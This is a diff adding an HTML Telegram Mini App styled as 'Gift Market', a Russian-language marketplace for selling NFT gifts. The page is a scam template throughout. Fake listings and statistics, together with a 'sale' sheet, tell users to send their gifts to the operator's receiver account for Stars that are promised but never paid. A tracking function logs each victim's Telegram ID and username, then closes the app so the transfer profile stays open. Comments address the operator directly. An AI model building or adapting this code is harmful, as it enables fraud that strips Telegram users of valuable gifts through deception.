@@ -1,0 +1,119 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>Gift Market</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+  :root{--bg:#0e1621;--card:#17212b;--accent:#2ea6ff;--text:#fff;--muted:#8a9aa9}
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:var(--bg);color:var(--text);padding-bottom:90px}
+  .header{display:flex;align-items:center;gap:12px;padding:16px;border-bottom:1px solid #1f2c3a}
+  .logo{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,#2ea6ff,#7b61ff);display:grid;place-items:center;font-weight:700}
+  .header h1{font-size:17px;margin:0;font-weight:600}
+  .header small{color:var(--muted);font-size:12px}
+  .stats{display:flex;gap:10px;padding:14px 16px}
+  .stat{flex:1;background:var(--card);border-radius:12px;padding:12px}
+  .stat b{display:block;font-size:20px}
+  .stat span{color:var(--muted);font-size:12px}
+  .section{padding:0 16px;margin-top:8px}
+  .section h2{font-size:14px;color:var(--muted);font-weight:600;margin:16px 0 10px;text-transform:uppercase;letter-spacing:.5px}
+  .gift{background:var(--card);border-radius:14px;padding:14px;display:flex;align-items:center;gap:14px;margin-bottom:10px}
+  .gift .icon{width:56px;height:56px;border-radius:12px;background:linear-gradient(135deg,#ff6b6b,#ffd93d);display:grid;place-items:center;font-size:26px}
+  .gift .meta{flex:1}
+  .gift .meta b{display:block;font-size:15px;margin-bottom:4px}
+  .gift .meta span{color:var(--muted);font-size:13px}
+  .gift .price{font-weight:700;color:var(--accent);font-size:15px;white-space:nowrap}
+  .sell-btn{position:fixed;left:16px;right:16px;bottom:16px;background:var(--accent);color:#fff;border:0;border-radius:14px;padding:16px;font-size:16px;font-weight:600;cursor:pointer}
+  .sell-btn:active{transform:scale(.98)}
+  /* модалка "продажи" */
+  .overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);display:none;align-items:flex-end;z-index:50}
+  .overlay.show{display:flex}
+  .sheet{background:var(--card);width:100%;border-radius:20px 20px 0 0;padding:20px 16px 28px;animation:up .25s ease}
+  @keyframes up{from{transform:translateY(100%)}to{transform:translateY(0)}}
+  .sheet h3{margin:0 0 8px;font-size:18px}
+  .sheet p{color:var(--muted);font-size:14px;line-height:1.5;margin:0 0 16px}
+  .sheet ol{color:var(--muted);font-size:14px;line-height:1.6;padding-left:18px;margin:0 0 20px}
+  .sheet .go{display:block;width:100%;text-align:center;background:var(--accent);color:#fff;border:0;border-radius:12px;padding:15px;font-size:16px;font-weight:600;text-decoration:none}
+  .sheet .cancel{display:block;width:100%;text-align:center;background:transparent;color:var(--muted);border:0;padding:14px;font-size:14px;margin-top:6px;cursor:pointer}
+</style>
+</head>
+<body>
+<div class="header">
+  <div class="logo">GM</div>
+  <div>
+    <h1>Gift Market</h1>
+    <small>Площадка продажи подарков</small>
+  </div>
+</div>
+
+<div class="stats">
+  <div class="stat"><b>12 480</b><span>продано сегодня</span></div>
+  <div class="stat"><b>0.8%</b><span>комиссия</span></div>
+</div>
+
+<div class="section">
+  <h2>Ваши подарки</h2>
+  <div id="gifts"></div>
+</div>
+
+<button class="sell-btn" onclick="openSheet()">Продать подарок</button>
+
+<div class="overlay" id="ov" onclick="if(event.target===this)closeSheet()">
+  <div class="sheet">
+    <h3>Продажа подарка</h3>
+    <p>Чтобы завершить продажу, передайте подарок нашему приёмнику. Звёзды зачислим после проверки.</p>
+    <ol>
+      <li>Нажмите «Передать подарок» ниже</li>
+      <li>В открывшемся профиле выберите «Отправить подарок»</li>
+      <li>Отправьте подарок — звёзды придут в течение 24 часов</li>
+    </ol>
+    <a class="go" id="goBtn" href="#" onclick="track()">Передать подарок</a>
+    <button class="cancel" onclick="closeSheet()">Отмена</button>
+  </div>
+</div>
+
+<script>
+const tg = window.Telegram.WebApp;
+tg.ready();
+tg.expand();
+
+// твой аккаунт-приёмник
+const RECEIVER = "your_receiver_username"; // без @
+document.getElementById("goBtn").href = "https://t.me/" + RECEIVER;
+
+// фейковые "подарки пользователя" — можно брать из initDataUnsafe
+const DEMO = [
+  {name:"Plush Pepe", price:"12 500 ⭐"},
+  {name:"Durov's Cap", price:"8 200 ⭐"},
+  {name:"Heart", price:"1 400 ⭐"},
+  {name:"Cake", price:"900 ⭐"},
+];
+const box = document.getElementById("gifts");
+DEMO.forEach(g=>{
+  const d=document.createElement("div");
+  d.className="gift";
+  d.innerHTML=`<div class="icon">🎁</div>
+    <div class="meta"><b>${g.name}</b><span>NFT подарок</span></div>
+    <div class="price">${g.price}</div>`;
+  box.appendChild(d);
+});
+
+function openSheet(){document.getElementById("ov").classList.add("show");}
+function closeSheet(){document.getElementById("ov").classList.remove("show");}
+
+function track(){
+  // лог в твой сервер — кто нажал "передать"
+  const user = tg.initDataUnsafe?.user || {};
+  fetch("/log",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({event:"sell_click", user_id:user.id, username:user.username, ts:Date.now()})
+  }).catch(()=>{});
+  // через 1.5 сек закрываем мини-апп, чтобы остался открытый профиль
+  setTimeout(()=>tg.close(), 1500);
+}
+</script>
+</body>
+</html>
